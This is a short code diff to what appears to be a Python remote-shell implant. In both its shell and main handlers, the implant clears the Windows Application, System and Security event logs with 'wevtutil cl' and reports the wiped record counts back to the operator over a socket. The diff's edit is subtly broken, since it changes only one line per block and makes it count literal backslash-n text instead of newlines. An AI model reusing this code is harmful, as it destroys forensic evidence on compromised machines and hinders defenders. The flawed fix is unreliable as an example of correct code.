@@ -175,7 +175,7 @@ def shell(client_socket):
                     application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                     system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                     security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\n')} records from Application...\n".encode('utf-8')))
+                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\n')} records from Application...\n".encode('utf-8')))
                     client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\n')} records from System...\n".encode('utf-8')))
                     client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\n')} records from Security...\n".encode('utf-8')))
                 except Exception as e:
@@ -350,7 +350,7 @@ def main():
                     application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
                     system_log = subprocess.run("wevtutil cl System", shell=True, capture_output=True, text=True)
                     security_log = subprocess.run("wevtutil cl Security", shell=True, capture_output=True, text=True)
-                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\n')} records from Application...\n".encode('utf-8')))
+                    client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {application_log.stdout.count('\\n')} records from Application...\n".encode('utf-8')))
                     client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {system_log.stdout.count('\n')} records from System...\n".encode('utf-8')))
                     client_socket.send(tlv_encode(TLV_TYPE_RESPONSE, f"[*] Wiping {security_log.stdout.count('\n')} records from Security...\n".encode('utf-8')))
                 except Exception as e:
